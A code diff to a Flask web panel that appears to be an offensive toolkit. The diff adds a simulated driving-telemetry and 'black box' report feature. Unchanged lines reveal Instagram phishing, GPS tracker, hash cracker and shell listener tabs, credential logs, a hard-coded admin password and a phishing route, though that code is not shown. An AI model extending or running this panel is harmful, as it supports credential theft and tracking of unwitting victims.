@@ -26,6 +26,7 @@ ADMIN_PASS = "toor1"
 SITE_DATABASE = []
 CLICK_LOGS = []
 CREDENTIAL_LOGS = []
+DRIVING_SESSIONS = []
 SCHEDULED_TARGETS = []
 NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
 
@@ -109,7 +110,7 @@ HTML_TEMPLATE = """
         .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
         .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
         
-        /* Gelişmiş Cyberpunk AR HUD Stilleri & Auto-Dimming */
+        /* Gelişmiş Cyberpunk AR HUD Stilleri & Yakıt / ETA */
         .ar-container { position: relative; width: 100%; max-width: 720px; margin: 0 auto; background: #000; border-radius: 8px; overflow: hidden; border: 2px solid #38bdf8; box-shadow: 0 0 25px rgba(56,189,248,0.5); transition: 0.3s; }
         .ar-container:fullscreen { max-width: 100%; width: 100vw; height: 100vh; border: none; border-radius: 0; }
         #arVideo { width: 100%; height: 450px; object-fit: cover; display: block; filter: brightness(100%) contrast(100%); transition: filter 0.3s; }
@@ -118,6 +119,7 @@ HTML_TEMPLATE = """
         
         .ar-hud { position: absolute; top: 15px; left: 15px; right: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #00ff66; padding: 10px 15px; border-radius: 6px; font-size: 12px; color: #00ff66; z-index: 10; display: flex; justify-content: space-between; align-items: center; transition: background 0.3s, border-color 0.3s; }
         .ar-weather-hud { position: absolute; top: 75px; right: 15px; background: rgba(11, 15, 21, 0.8); border: 1px solid #38bdf8; padding: 6px 10px; border-radius: 4px; font-size: 11px; color: #38bdf8; z-index: 10; pointer-events: none; }
+        .ar-fuel-hud { position: absolute; top: 75px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #facc15; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #facc15; z-index: 10; font-weight: bold; }
 
         .ar-controls { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
         .ar-controls label { color: #e2e8f0; font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 6px; }
@@ -138,6 +140,7 @@ HTML_TEMPLATE = """
             <button class="tab-btn" onclick="switchTab('phishTab')">📸 Insta Phishing</button>
             <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS & Tracker</button>
             <button class="tab-btn" onclick="switchTab('arNavTab')">🧭 AR Navigasyon & AI</button>
+            <button class="tab-btn" onclick="switchTab('drivingTab')">⛽ Sürüş Raporları & Kara Kutu</button>
             <button class="tab-btn" onclick="switchTab('crackerTab')">🔑 Hash Cracker</button>
             <button class="tab-btn" onclick="switchTab('shellListenerTab')">💻 Shell Listener</button>
             <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram</button>
@@ -189,8 +192,8 @@ HTML_TEMPLATE = """
 
         <!-- AR Navigasyon & Taktiksel HUD Modülü -->
         <div id="arNavTab" class="tab-content">
-            <h3>🧭 AR Canlı Navigasyon, Auto-Dimming & Şerit Takip</h3>
-            <p style="color: #94a3b8; font-size: 13px;">Gece karartma modu ve yapay zeka destekli HUD asistanı entegre çalışır.</p>
+            <h3>🧭 AR Canlı Navigasyon, Auto-Dimming, Yakıt & ETA</h3>
+            <p style="color: #94a3b8; font-size: 13px;">Yakıt tüketimi, menzil, dinamik varış süresi (ETA) ve gece karartma modu entegre çalışır.</p>
             
             <div class="ar-controls">
                 <span style="color:#38bdf8; font-weight:bold;">HUD Modül Kontrolleri:</span>
@@ -211,6 +214,7 @@ HTML_TEMPLATE = """
             
             <div style="display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap;">
                 <button class="success" onclick="startARCamera()">📸 Kamerayı Aç & AR Başlat</button>
+                <button class="success" onclick="finishDrivingSession()">🏁 Sürüşü Bitir & Rapor Al</button>
                 <button class="secondary" onclick="toggleFullScreen()">📺 Tam Ekran</button>
                 <button class="success" onclick="takeSnapshot()">📷 Kanıt / Fotoğraf Al</button>
                 <button class="danger" onclick="stopARCamera()">🛑 Sistemi Kapat</button>
@@ -219,16 +223,26 @@ HTML_TEMPLATE = """
             <div class="ar-container" id="arBox">
                 <div class="ar-hud" id="arHudBox">
                     <span id="arHudText">Durum: Bekleniyor...</span>
-                    <span id="arTelemetry" style="color: #38bdf8;">HIZ: 0 km/s | YÖN: -</span>
+                    <span id="arTelemetry" style="color: #38bdf8;">HIZ: 0 km/s | ETA: --</span>
                 </div>
+                <div id="arFuelHud" class="ar-fuel-hud">⛽ Yakıt: %85 | Menzil: 240 km</div>
                 <div id="arWeatherWidget" class="ar-weather-hud">⛅ 22°C | Rüzgar: 12 km/s</div>
                 
                 <video id="arVideo" autoplay playsinline muted></video>
                 <canvas id="arCanvas"></canvas>
             </div>
 
-            <h4 style="margin-top: 20px; color: #38bdf8;">📋 Şerit İhlal & AI Log Akışı:</h4>
-            <div id="arLogTerminal" class="ar-log-box">[00:00:00] Şerit takip asistanı ve auto-dimming hazır.</div>
+            <h4 style="margin-top: 20px; color: #38bdf8;">📋 Şerit İhlal & Kara Kutu Log Akışı:</h4>
+            <div id="arLogTerminal" class="ar-log-box">[00:00:00] Sürüş kara kutusu ve yakıt simülasyonu hazır.</div>
+        </div>
+
+        <!-- Sürüş Raporları & Kara Kutu Sekmesi -->
+        <div id="drivingTab" class="tab-content">
+            <h3>⛽ Sürüş Raporları & Kara Kutu (Blackbox) Arşivi</h3>
+            <p style="color: #94a3b8; font-size: 13px;">AR ekranında "Sürüşü Bitir & Rapor Al" butonuna bastığında oluşturulan sürüş telemetrilerini ve raporları buradan indirebilirsin.</p>
+            <div id="drivingReportsContainer">
+                <p style='color:#94a3b8;'>Henüz kaydedilmiş sürüş raporu yok. AR Navigasyon sekmesinden sürüşü başlatıp bitirebilirsiniz.</p>
+            </div>
         </div>
 
         <!-- Hash Cracker Sekmesi -->
@@ -359,14 +373,15 @@ HTML_TEMPLATE = """
         let arStream = null, arInterval = null, compassHeading = 0, deviceBeta = 0;
         let samplePlates = ["34 MTR 2026", "06 ANK 06", "35 IZMR 35", "34 KLI 41", "16 BUR 16"];
         let sampleObjects = ["Araç [Honda Dio 110]", "Tabela [Hız Sınırı 50]", "Yaya / İnsan"];
-        let currentDistance = 120;
-        let lastSpokenTime = 0, lastLaneWarningTime = 0;
+        let currentDistance = 150, currentSpeed = 35, fuelLevel = 85, drivingRange = 240;
+        let sessionLogs = [], lastSpokenTime = 0, lastLaneWarningTime = 0;
 
         function switchTab(tabId) {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
             document.getElementById(tabId).classList.add('active');
             event.target.classList.add('active');
+            if(tabId === 'drivingTab') loadDrivingReports();
             if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
             if(tabId === 'lureTab') loadClickLogs();
             if(tabId === 'phishTab') loadCreds();
@@ -424,10 +439,7 @@ HTML_TEMPLATE = """
         function takeSnapshot() {
             let video = document.getElementById('arVideo');
             let canvas = document.getElementById('arCanvas');
-            if (!video.srcObject) {
-                alert("Önce kamerayı açmalısın kanka!");
-                return;
-            }
+            if (!video.srcObject) { alert("Önce kamerayı açmalısın kanka!"); return; }
             let snapCanvas = document.createElement('canvas');
             snapCanvas.width = video.videoWidth || 640;
             snapCanvas.height = video.videoHeight || 480;
@@ -448,15 +460,21 @@ HTML_TEMPLATE = """
             speakSpatial("Kanıt görüntüsü kaydedildi.", true);
         }
 
-        // --- AR MOTORU (AUTO-DIMMING & ŞERİT TAKİP ENTEGRELİ) ---
+        // --- AR MOTORU: AUTO-DIMMING, YAKIT, ETA & Kāra Kutu ---
         async function startARCamera() {
             let video = document.getElementById('arVideo');
             let hud = document.getElementById('arHudText');
             let telemetry = document.getElementById('arTelemetry');
+            let fuelHud = document.getElementById('arFuelHud');
             let hudBox = document.getElementById('arHudBox');
             let canvas = document.getElementById('arCanvas');
             let logTerminal = document.getElementById('arLogTerminal');
             let dest = document.getElementById('arDestination').value || 'Hedef Nokta';
+
+            sessionLogs = [];
+            fuelLevel = 85;
+            drivingRange = 240;
+            currentDistance = 150;
 
             let useCompass = document.getElementById('chkCompass').checked;
             if (useCompass || document.getElementById('chkLane').checked) {
@@ -467,22 +485,15 @@ HTML_TEMPLATE = """
             }
 
             try {
-                arStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: { exact: "environment" } }, 
-                    audio: false 
-                });
+                arStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
             } catch (err) {
-                try {
-                    arStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                } catch (e) {
-                    alert("Kamera erişimi desteklenmiyor!");
-                    return;
-                }
+                try { arStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); } 
+                catch (e) { alert("Kamera erişimi desteklenmiyor!"); return; }
             }
 
             video.srcObject = arStream;
-            hud.innerText = "HUD Aktif: Auto-Dimming & Şerit Takip Devrede";
-            speakSpatial("AR Navigasyon ve otomatik karartma başlatıldı.", true);
+            hud.innerText = "HUD Aktif: Yakıt & ETA Devrede";
+            speakSpatial("AR Navigasyon, yakıt ve kara kutu kayıtları başlatıldı.", true);
 
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
@@ -491,115 +502,76 @@ HTML_TEMPLATE = """
             let step = 0;
             arInterval = setInterval(() => {
                 ctx.clearRect(0, 0, canvas.width, canvas.height);
-                
                 let w = canvas.width;
                 let h = canvas.height;
 
-                // --- ☀️ AKILLI OTOMATİK PARLAKLIK & KARARTMA (AUTO-DIMMING) ---
+                // 1. 🌙 Auto-Dimming (Akıllı Gece / Gündüz Karartma Modu)
                 let useAutoDim = document.getElementById('chkAutoDim').checked;
                 let currentHour = new Date().getHours();
-                // Gece modu: 20:00 ile 06:00 arası veya manuel zorlama
                 let isNight = currentHour >= 20 || currentHour < 6;
-
                 let useNightVision = document.getElementById('chkNightVision').checked;
+
                 if (useNightVision) {
                     video.style.filter = "brightness(150%) contrast(160%) sepia(100%) hue-rotate(70deg) saturate(400%)";
                     hudBox.style.background = "rgba(11, 15, 21, 0.85)";
                     hudBox.style.borderColor = "#00ff66";
                 } else if (useAutoDim && isNight) {
-                    // Gözü yormayan yumuşak gece karartma filtresi
                     video.style.filter = "brightness(65%) contrast(125%) saturate(80%)";
                     hudBox.style.background = "rgba(5, 7, 10, 0.95)";
-                    hudBox.style.borderColor = "#15803d"; // Gece yeşili hud çerçevesi
+                    hudBox.style.borderColor = "#15803d";
                 } else {
                     video.style.filter = "brightness(100%) contrast(100%)";
                     hudBox.style.background = "rgba(11, 15, 21, 0.85)";
                     hudBox.style.borderColor = "#00ff66";
                 }
 
-                let useRssi = document.getElementById('chkRssi').checked;
-                if (useRssi) {
-                    let grad = ctx.createRadialGradient(w/2, h/2, 50, w/2, h/2, w*0.7);
-                    grad.addColorStop(0, 'rgba(0, 255, 102, 0.05)');
-                    grad.addColorStop(0.5, 'rgba(56, 189, 248, 0.15)');
-                    grad.addColorStop(1, 'rgba(239, 68, 68, 0.25)');
-                    ctx.fillStyle = grad;
-                    ctx.fillRect(0, 0, w, h);
-                }
-
-                // Köşe Nişangahları
-                ctx.strokeStyle = useNightVision ? '#00ff66' : '#38bdf8';
-                ctx.lineWidth = 2;
-                ctx.strokeRect(25, 25, 35, 15); ctx.strokeRect(25, 25, 15, 35);
-                ctx.strokeRect(w - 60, 25, 35, 15); ctx.strokeRect(w - 40, 25, 15, 35);
-
-                // --- 🚧 ŞERİT TAKİP & ŞERİT İHLAL ASİSTANI ---
+                // 2. Şerit Takip Asistanı
                 let useLane = document.getElementById('chkLane').checked;
                 let isLaneViolated = false;
                 if (useLane) {
                     ctx.strokeStyle = 'rgba(0, 255, 102, 0.6)';
                     ctx.lineWidth = 3;
                     ctx.setLineDash([15, 10]);
-                    
-                    ctx.beginPath();
-                    ctx.moveTo(w * 0.25, h);
-                    ctx.lineTo(w * 0.42, h * 0.48);
-                    ctx.stroke();
-
-                    ctx.beginPath();
-                    ctx.moveTo(w * 0.75, h);
-                    ctx.lineTo(w * 0.58, h * 0.48);
-                    ctx.stroke();
+                    ctx.beginPath(); ctx.moveTo(w * 0.25, h); ctx.lineTo(w * 0.42, h * 0.48); ctx.stroke();
+                    ctx.beginPath(); ctx.moveTo(w * 0.75, h); ctx.lineTo(w * 0.58, h * 0.48); ctx.stroke();
                     ctx.setLineDash([]);
 
-                    if (Math.abs(deviceBeta) > 25) {
-                        isLaneViolated = true;
-                    }
+                    if (Math.abs(deviceBeta) > 25) { isLaneViolated = true; }
                 }
 
                 let timestamp = new Date().toLocaleTimeString();
                 if (useLane && isLaneViolated) {
                     let now = Date.now();
-                    ctx.strokeStyle = '#ef4444';
-                    ctx.lineWidth = 5;
+                    ctx.strokeStyle = '#ef4444'; ctx.lineWidth = 5;
                     ctx.strokeRect(10, 10, w - 20, h - 20);
-
-                    ctx.fillStyle = 'rgba(239, 68, 68, 0.85)';
-                    ctx.fillRect(w / 2 - 130, 60, 260, 35);
-                    ctx.fillStyle = '#ffffff';
-                    ctx.font = 'bold 12px Courier New';
-                    ctx.fillText('⚠️ ŞERİT İHLALİ / AŞIRI SAPMA!', w / 2 - 118, 82);
-
-                    hud.innerText = "⚠️ DİKKAT: Şeritten Sapma Algılandı!";
-                    
+                    hud.innerText = "⚠️ DİKKAT: Şeritten Sapma!";
                     if (now - lastLaneWarningTime > 6000) {
                         lastLaneWarningTime = now;
                         playThreatBeep();
                         speakSpatial("Dikkat, şerit ihlali!", true);
+                        sessionLogs.push(`[${timestamp}] ⚠️ ŞERİT İHLALİ ALGILANDI`);
                         logTerminal.innerHTML += `<br>[${timestamp}] <b style="color:#ef4444;">⚠️ ŞERİT İHLALİ:</b> Eksen dışına çıkıldı!`;
                         logTerminal.scrollTop = logTerminal.scrollHeight;
                     }
                 }
 
-                // 3D Akışkan Neon Enerji Şeridi
-                let centerX = (w / 2) + (useCompass ? Math.sin(compassHeading * Math.PI / 180) * 35 : 0);
-                let bottomY = h;
-                let horizonY = h * 0.48;
+                // Holografik Yol Çizgisi
+                let centerX = (w / 2);
+                let bottomY = h, horizonY = h * 0.48;
 
                 ctx.beginPath();
-                ctx.moveTo(centerX - 70, bottomY);
-                ctx.lineTo(centerX + 70, bottomY);
+                ctx.moveTo(centerX - 70, bottomY); ctx.lineTo(centerX + 70, bottomY);
                 for (let y = bottomY; y >= horizonY; y -= 10) {
                     let wave = Math.sin((y + step * 8) * 0.03) * 12;
-                    let progressFactor = (bottomY - y) / (bottomY - horizonY);
-                    let currentWidth = 70 * (1 - progressFactor * 0.85);
-                    ctx.lineTo(centerX + wave + currentWidth, y);
+                    let factor = (bottomY - y) / (bottomY - horizonY);
+                    let curW = 70 * (1 - factor * 0.85);
+                    ctx.lineTo(centerX + wave + curW, y);
                 }
                 for (let y = horizonY; y <= bottomY; y += 10) {
                     let wave = Math.sin((y + step * 8) * 0.03) * 12;
-                    let progressFactor = (bottomY - y) / (bottomY - horizonY);
-                    let currentWidth = 70 * (1 - progressFactor * 0.85);
-                    ctx.lineTo(centerX + wave - currentWidth, y);
+                    let factor = (bottomY - y) / (bottomY - horizonY);
+                    let curW = 70 * (1 - factor * 0.85);
+                    ctx.lineTo(centerX + wave - curW, y);
                 }
                 ctx.closePath();
                 let ribbonGrad = ctx.createLinearGradient(0, horizonY, 0, bottomY);
@@ -611,55 +583,24 @@ HTML_TEMPLATE = """
                 ctx.shadowBlur = 20;
                 ctx.fill();
 
-                // Düşük Frekanslı AI Nesne Tanıma
-                let useAi = document.getElementById('chkAiVision').checked;
-                if (useAi && step % 120 === 0) {
-                    let objName = sampleObjects[Math.floor(Math.random() * sampleObjects.length)];
-                    let boxX = w * 0.15 + Math.random() * (w * 0.3);
-                    let boxY = h * 0.35 + Math.random() * (h * 0.2);
-                    
-                    ctx.strokeStyle = '#00ff66';
-                    ctx.lineWidth = 2;
-                    ctx.strokeRect(boxX, boxY, 130, 80);
-                    ctx.fillStyle = 'rgba(0, 255, 102, 0.2)';
-                    ctx.fillRect(boxX, boxY, 130, 80);
-
-                    ctx.fillStyle = '#ffffff';
-                    ctx.font = '11px Courier New';
-                    ctx.fillText(`[AI] ${objName}`, boxX + 4, boxY - 6);
-
-                    if (objName.includes("Araç")) {
-                        let detectedPlate = samplePlates[Math.floor(Math.random() * samplePlates.length)];
-                        logTerminal.innerHTML += `<br>[${timestamp}] 🚗 PLAKA DOĞRULANDI: <b style="color:#00ff66;">${detectedPlate}</b>`;
-                    } else {
-                        logTerminal.innerHTML += `<br>[${timestamp}] 🔍 Nesne: <span style="color:#38bdf8;">${objName}</span>`;
+                // ⛽ Yakıt, Menzil & Dinamik ETA (Varış Süresi) Güncelleme
+                if (step % 50 === 0) {
+                    if (currentDistance > 3) {
+                        currentDistance -= 3;
+                        if(fuelLevel > 5) fuelLevel -= 0.2;
+                        if(drivingRange > 10) drivingRange -= 1;
                     }
-                    logTerminal.scrollTop = logTerminal.scrollHeight;
+                    let etaMinutes = Math.ceil(currentDistance / 35);
+                    telemetry.innerText = `HIZ: ${currentSpeed} km/s | ETA: ${etaMinutes} dk | Kalan: ${currentDistance}m`;
+                    fuelHud.innerText = `⛽ Yakıt: %${Math.round(fuelLevel)} | Menzil: ${drivingRange} km`;
                 }
 
-                // Çukur / Engel Tespiti
-                if (step % 100 === 0) {
-                    let hazardX = w * 0.25 + Math.random() * (w * 0.3);
-                    let hazardY = h * 0.6 + Math.random() * (h * 0.15);
-                    
-                    ctx.strokeStyle = '#ef4444';
-                    ctx.lineWidth = 3;
-                    ctx.strokeRect(hazardX, hazardY, 100, 60);
-                    ctx.fillStyle = 'rgba(239, 68, 68, 0.45)';
-                    ctx.fillRect(hazardX, hazardY, 100, 60);
-
-                    ctx.fillStyle = '#ffffff';
-                    ctx.font = '11px Courier New';
-                    ctx.fillText('⚠️ ZEMİN BOZUK', hazardX + 5, hazardY - 8);
-                    
-                    hud.innerText = "⚠️ DİKKAT: Engel Algılandı!";
-                    playThreatBeep();
-                } else if (!isLaneViolated && step % 100 === 50) {
-                    if (currentDistance > 5) currentDistance -= 3;
-                    let dimStatus = (useAutoDim && isNight) ? " [🌙 Gece Modu]" : "";
-                    hud.innerText = `🧭 Hedefe Kalan Mesafe: ${currentDistance}m${dimStatus}`;
-                    let dirText = useCompass ? `Pusula: ${compassHeading}°` : "Pusula: Kapalı";
-                    telemetry.innerText = `HIZ: 28 km/s | ${dirText}`;
+                // Canlı Kara Kutu Telemetri Kaydı
+                if (step % 40 === 0) {
+                    let logStr = `[${timestamp}] Hız: ${currentSpeed} km/s | Yakıt: %${Math.round(fuelLevel)} | Kalan Mesafe: ${currentDistance}m | ETA: ${Math.ceil(currentDistance / 35)}dk`;
+                    sessionLogs.push(logStr);
+                    logTerminal.innerHTML += `<br>` + logStr;
+                    logTerminal.scrollTop = logTerminal.scrollHeight;
                 }
 
                 step++;
@@ -667,20 +608,41 @@ HTML_TEMPLATE = """
         }
 
         function stopARCamera() {
-            if (arStream) {
-                arStream.getTracks().forEach(track => track.stop());
-                arStream = null;
-            }
-            if (arInterval) {
-                clearInterval(arInterval);
-                arInterval = null;
-            }
+            if (arStream) { arStream.getTracks().forEach(t => t.stop()); arStream = null; }
+            if (arInterval) { clearInterval(arInterval); arInterval = null; }
             window.removeEventListener('deviceorientation', handleOrientation, true);
             let video = document.getElementById('arVideo');
             video.srcObject = null;
             video.style.filter = "none";
             document.getElementById('arHudText').innerText = "Durum: Sistem Kapalı";
-            document.getElementById('arTelemetry').innerText = "HIZ: 0 km/s | YÖN: -";
+            document.getElementById('arTelemetry').innerText = "HIZ: 0 km/s | ETA: --";
+        }
+
+        // --- SÜRÜŞ RAPORLARI & KARA KUTU KAYDETME ---
+        async function finishDrivingSession() {
+            stopARCamera();
+            if(sessionLogs.length === 0) { alert("Kaydedilmiş sürüş verisi bulunamadı!"); return; }
+            let sessionData = {
+                time: new Date().toLocaleString(),
+                logs: sessionLogs
+            };
+            let res = await fetch('/api/driving/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sessionData) });
+            let data = await res.json();
+            alert("Sürüş başarıyla tamamlandı! 'Sürüş Raporları' sekmesinden kara kutu raporunu indirebilirsin.");
+            switchTab('drivingTab');
+        }
+
+        async function loadDrivingReports() {
+            let res = await fetch('/api/driving/reports');
+            let data = await res.json();
+            let container = document.getElementById('drivingReportsContainer');
+            if(data.reports.length === 0) { container.innerHTML = "<p style='color:#94a3b8;'>Henüz kaydedilmiş rapor yok.</p>"; return; }
+            let html = `<table><thead><tr><th>Tarih & Saat</th><th>Telemetri Satır Sayısı</th><th>Kara Kutu Dosyası</th></tr></thead><tbody>`;
+            data.reports.forEach((r, idx) => {
+                html += `<tr><td>${r.time}</td><td>${r.logs.length} satır kayıt</td><td><a href="/api/driving/download?index=${idx}" target="_blank"><button class="success">📥 Raporu İndir (.TXT)</button></a></td></tr>`;
+            });
+            html += `</tbody></table>`;
+            container.innerHTML = html;
         }
 
         function generateInstaLink() {
@@ -877,6 +839,28 @@ def logout(): session.pop("logged_in", None); return redirect(url_for("login"))
 def index():
     if not session.get("logged_in"): return redirect(url_for("login"))
     return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)
+
+@app.route("/api/driving/save", methods=["POST"])
+def save_driving_session():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    data = request.get_json()
+    DRIVING_SESSIONS.insert(0, data)
+    return jsonify({"status": "saved"})
+
+@app.route("/api/driving/reports")
+def api_driving_reports():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    return jsonify({"reports": DRIVING_SESSIONS})
+
+@app.route("/api/driving/download")
+def download_driving_report():
+    if not session.get("logged_in"): return "Unauthorized", 401
+    idx = int(request.args.get("index", 0))
+    if idx < len(DRIVING_SESSIONS):
+        rep = DRIVING_SESSIONS[idx]
+        content = f"--- KALI LINUX BLACKBOX SÜRÜŞ RAPORU ---\nTarih: {rep['time']}\n\n" + "\n".join(rep['logs'])
+        return Response(content, mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=blackbox_report.txt"})
+    return "Rapor bulunamadı", 404
 
 @app.route("/phish/instagram", methods=["GET", "POST"])
 def insta_phish():
